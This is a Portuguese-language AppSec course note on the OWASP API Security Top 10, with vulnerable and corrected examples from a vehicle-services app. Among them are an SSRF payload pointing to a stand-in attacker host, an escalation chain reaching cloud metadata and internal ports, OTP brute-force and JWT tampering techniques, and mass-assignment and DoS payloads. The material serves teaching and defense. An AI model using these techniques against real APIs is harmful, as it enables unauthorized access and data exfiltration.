---
title: "API Security Top 10"
---

# OWASP API Security Top 10 (2023)

> Fonte: curso AppSec PT-BR — cobertura prática do OWASP API Top 10 com demos em aplicação de mobilidade urbana (veículos, mecânicos, serviços).

---

## Visão Geral

APIs são a superfície de ataque principal de aplicações modernas. Em relação ao OWASP Web Top 10, as diferenças são estruturais: APIs expõem dados diretamente sem HTML intermediário, tornando vazamentos de dados imediatos. O versionamento (v1, v2, v3) cria superfície de ataque adicional porque versões antigas frequentemente mantêm endpoints sem os controles das versões mais recentes. A autorização é intrinsecamente mais complexa em APIs — é preciso controlar acesso por objeto, por propriedade do objeto e por função, em vez de apenas por papel. E o consumo por múltiplos clientes simultâneos (mobile, frontend web, parceiros, IoT) amplifica o impacto de qualquer falha de autorização.

| ID | Vulnerabilidade |
|----|----------------|
| API1 | Broken Object Level Authorization (BOLA) |
| API2 | Broken Authentication |
| API3 | Broken Object Property Level Authorization |
| API4 | Unrestricted Resource Consumption |
| API5 | Broken Function Level Authorization |
| API6 | Unrestricted Access to Sensitive Business Flows |
| API7 | Server-Side Request Forgery |
| API8 | Security Misconfiguration |
| API9 | Improper Inventory Management |
| API10 | Unsafe Consumption of APIs |

---

## API1 — Broken Object Level Authorization (BOLA)

**Definição**: API não verifica se o usuário autenticado tem permissão para acessar o objeto específico solicitado (verifica autenticação, não autorização por objeto).

**Padrão vulnerável**:
```
GET /api/v1/vehicles/{vehicle_id}
Cookie: session=VALID_SESSION

# Sem validar se vehicle_id pertence ao usuário da sessão
# Usuário A acessa veículo do usuário B trocando o ID
```

**Impacto**: exposição de dados pessoais (email, localização, histórico), escalada horizontal.

**Causa no código**:
```python
# VULNERÁVEL
@app.route('/api/vehicles/<int:vehicle_id>')
def get_vehicle(vehicle_id):
    vehicle = Vehicle.query.get(vehicle_id)
    return jsonify(vehicle)  # sem verificar se vehicle.user_id == current_user.id

# CORRETO
def get_vehicle(vehicle_id):
    vehicle = Vehicle.query.get_or_404(vehicle_id)
    if vehicle.user_id != current_user.id:
        return jsonify({'error': 'Forbidden'}), 403
    return jsonify(vehicle)
```

**Detecção**:
- Trocar IDs sequenciais: `/api/vehicles/10`, `/api/vehicles/11`, `/api/vehicles/12`
- Verificar se resposta retorna dados de outros usuários
- UUIDs não eliminam a vulnerabilidade — apenas dificultam enumeração

---

## API2 — Broken Authentication

**Definição**: Falhas nos mecanismos de verificação de identidade.

**Exemplo prático — OTP brute force**:
```
# OTP de 4 dígitos = 10.000 possibilidades

# API v3: rate limit após ~8 tentativas → bloqueado
POST /api/v3/auth/verify-otp  {"otp": "0001"}  → 200/400
POST /api/v3/auth/verify-otp  {"otp": "0002"}  → 429 Too Many Requests

# API v2: sem rate limit → brute force viável
POST /api/v2/auth/verify-otp  {"otp": "0001"}  → continua indefinidamente
POST /api/v2/auth/verify-otp  {"otp": "9999"}  → até encontrar
```

**Técnicas de exploração**:
- Burp Intruder: payload sequencial 0000-9999
- Python com retry automático até sucesso
- **API versioning bypass**: testar v1, v2, v3, v4 — versões antigas frequentemente sem os controles novos

**Outros padrões**:
- JWT sem verificação de assinatura (`verification=false`)
- JWT com algoritmo `none`
- Manipulação de claims JWT (trocar `user_type: customer` para `admin`)
- Tokens sem expiração

---

## API3 — Broken Object Property Level Authorization (BOPLA)

**Definição**: API retorna ou aceita mais propriedades do objeto do que o usuário deveria ver/modificar.

**Dois sub-tipos**:

**Mass Assignment** (escrita excessiva):
```
# Frontend envia apenas campos editáveis
PATCH /api/users/me
{"name": "João", "email": "joao@example.com"}

# Mas API aceita qualquer campo do modelo:
{"name": "João", "is_admin": true, "credit_balance": 99999}
# → Usuário se torna admin ou altera saldo
```

**Excessive Data Exposure** (leitura excessiva):
```json
GET /api/users/me
{
  "id": 1,
  "name": "João",
  "email": "joao@test.com",
  "password_hash": "...",     ← não deveria retornar
  "internal_notes": "...",    ← não deveria retornar
  "credit_card_last4": "4242"
}
```

**Mitigação**:
- Serializers explícitos: definir exatamente quais campos retornar/aceitar
- Evitar `Model.from_request(request.json)` sem allowlist

---

## API4 — Unrestricted Resource Consumption

**Definição**: API não limita consumo de recursos por usuário/sessão, permitindo DoS de camada 7.

**Exemplo**:
```
POST /api/requests/batch
{
  "repeat_request_failed": true,
  "number_of_repeats": 999999,   ← sem validação de limite
  "request": { ... }
}

# Servidor processa 999999 requisições → HTTP 503 Service Unavailable
```

**Dimensões de controle**:
- Limite de requisições por IP/usuário (rate limiting)
- Limite de tamanho de payload
- Limite de repetições/amplificações
- Timeout em processamentos longos
- Limite de resultados por página (paginação obrigatória)

---

## API5 — Broken Function Level Authorization (BFLA)

**Definição**: Usuário comum acessa endpoints/funções restritas a admins ou outros papéis.

**Padrões**:
```
# Endpoint admin acessível por usuário comum
GET /api/admin/users          → deve retornar 403 para não-admin
DELETE /api/users/{id}        → usuário deletar qualquer conta
POST /api/products            → qualquer usuário criar produto

# HTTP method tampering
GET  /api/orders/{id}         → 200 (permitido)
DELETE /api/orders/{id}       → 200 (deveria ser 403 para usuário)
```

**Diferença BOLA vs BFLA**:
- BOLA: usuário acessa *objeto* que não é dele (horizontal)
- BFLA: usuário acessa *função/endpoint* que não é do seu papel (vertical)

---

## API6 — Unrestricted Access to Sensitive Business Flows

**Definição**: API não protege fluxos de negócio sensíveis contra uso automatizado/abusivo.

**Exemplos**:
- Comprar todos os ingressos de show em segundos (scalping)
- Criar múltiplas contas trial automaticamente (free tier abuse)
- Abusar de sistemas de referral/coupon em escala
- Scraping massivo de preços/dados de produtos

**Diferença de DoS**: não derruba o servidor — abusa de regras de negócio legítimas em escala.

**Controles**:
- CAPTCHA em fluxos sensíveis
- Rate limit por usuário/IP/device fingerprint
- Detecção comportamental (velocidade de ações)
- Limite de criação de recursos por período

---

## API7 — Server-Side Request Forgery (SSRF)

**Definição em API**: campo que recebe URL é usado pelo backend para fazer requisição, sem validar o destino.

**Exemplo concreto (aplicação de veículos)**:
```
POST /api/mechanic/request
{
  "mechanic_api": "http://ATTACKER:8000/"   ← campo vulnerável
}

# Backend faz: requests.get(request.json['mechanic_api'])
# → Dados do pedido são enviados para servidor do atacante como query params
```

**Cadeia de escalada**:
1. SSRF externo → confirmar com servidor próprio (ver logs)
2. Redirecionar para localhost: `http://localhost:8888`
3. Escanear rede interna: `http://172.17.0.X:5432` (PostgreSQL), `http://172.17.0.X:27017` (MongoDB)
4. Acessar metadados cloud: `http://169.254.169.254/latest/meta-data/`

**Mitigação**:
```python
ALLOWED_URLS = ['https://api-parceiro.com', 'https://mechanic-service.internal']

def validate_url(url):
    if url not in ALLOWED_URLS:
        raise ValueError("URL não permitida")
    return url
```

Ver `../05_injecoes_servidor/03_ssrf.md` para técnicas avançadas (blind oracle, subnet scan, Kong RCE).

---

## API8 — Security Misconfiguration

**Definição**: Configurações padrão inseguras, permissões excessivas, dados sensíveis em respostas de erro, headers de segurança ausentes.

**Casos comuns em APIs**:
- Stack trace completo em respostas de erro em produção
- Headers de segurança ausentes (`Strict-Transport-Security`, `X-Content-Type-Options`)
- CORS `*` em APIs autenticadas
- Rate limiting ausente
- Método HTTP `TRACE` habilitado
- Endpoints de debug/healthcheck acessíveis externamente (`/actuator`, `/_debug`, `/graphql` sem auth)
- Credenciais padrão em serviços de infraestrutura

**Checklist básico**:
```
[ ] Response de erro retorna stack trace? (não deve em produção)
[ ] CORS configurado com origem específica (não *)?
[ ] Rate limiting habilitado nos endpoints públicos?
[ ] Versões de software não expostas em headers (Server, X-Powered-By)?
[ ] Endpoints de admin/debug acessíveis sem autenticação?
```

---

## API9 — Improper Inventory Management

**Definição**: Versões antigas/deprecated da API ficam acessíveis sem controles equivalentes às versões novas.

**Padrão do problema**:
```
API v3: rate limit, validação de input, logging completo
API v2: sem rate limit          ← ainda acessível!
API v1: sem autenticação        ← ainda acessível!
```

**Também inclui**:
- APIs internas expostas externamente (sem auth)
- Endpoints de staging/development acessíveis em produção
- Documentação Swagger/OpenAPI pública expondo endpoints sensíveis

**Controles**:
- Inventário centralizado de todas as APIs (APIM gateway)
- Deprecação e desativação forçada de versões antigas (não apenas "não documentar")
- Aplicar os mesmos controles de segurança em todas as versões ativas
- Revisar APIs de terceiros integradas periodicamente

---

## API10 — Unsafe Consumption of APIs

**Definição**: Aplicação consome APIs de terceiros sem validar os dados recebidos, tratando-os como confiáveis.

**Vetores**:
- API de terceiro retorna dados com injeção (XSS, SQLi) — app repassa sem sanitizar
- Redirecionamentos de APIs terceiras seguidos cegamente (SSRF via redirect)
- Dados de parceiro usado diretamente em query SQL ou template

**Exemplo**:
```python
# App consome API de geocodificação de terceiro
data = requests.get(f"https://geocode-api.com/?address={user_input}").json()

# Repassa o nome da cidade diretamente no HTML sem sanitizar
return render_template_string(f"<p>Cidade: {data['city']}</p>")
# → XSS se a API retornar city="<script>..."
```

**Controles**:
- Tratar dados de APIs externas como input não confiável
- Sanitizar/validar antes de usar em query, template ou response
- TLS obrigatório para consumo de APIs externas
- Não seguir redirects automaticamente sem validação

---

## Cheatsheet de Detecção

| Vulnerabilidade | Teste rápido |
|----------------|-------------|
| BOLA | Trocar ID no path/parâmetro por ID de outro usuário |
| Broken Auth | Brute force OTP, testar versões antigas de API |
| BOPLA | Enviar campos extras no body; verificar campos extras na resposta |
| Resource Consumption | Enviar `number_of_repeats: 99999` ou payload enorme |
| BFLA | Acessar `/admin/` endpoints com token de usuário comum |
| Business Flow | Criar múltiplos recursos em sequência rápida via script |
| SSRF | Injetar URL do Burp Collaborator em campos de URL |
| Misconfig | `GET /` retorna stack trace? Verificar headers de resposta |
| Inventory | Tentar `/api/v1/`, `/api/v2/` para endpoints documentados em v3 |
| Unsafe Consumption | Verificar se dados de API terceira aparecem no response sem encode |

---

## Módulos Relacionados

O OWASP API Security Top 10 funciona como mapa de referência cruzada entre as vulnerabilidades específicas de API e os módulos que as cobrem em profundidade. API1 (BOLA) é o equivalente de API do que `../08_access_control/01_idor.md` cobre em contexto web — IDOR e BOLA são a mesma falha de autorização por objeto em contextos diferentes. API2 (Broken Authentication) conecta diretamente com `../07_autenticacao/02_jwt_attacks.md`, que detalha os ataques a JWT que constituem a maioria dos casos práticos de broken auth em APIs modernas. API7 (SSRF) tem tratamento aprofundado em `../05_injecoes_servidor/03_ssrf.md`, incluindo blind oracle e exploração de Kong RCE. As técnicas avançadas de API REST (verb tampering, mass assignment) e GraphQL (introspection, batching DoS) estão em `../11_apis_avancado/01_rest_api_attacks.md` e `../11_apis_avancado/02_graphql_attacks.md` respectivamente. A referência normativa é o OWASP API Security Top 10 (https://owasp.org/API-Security/).
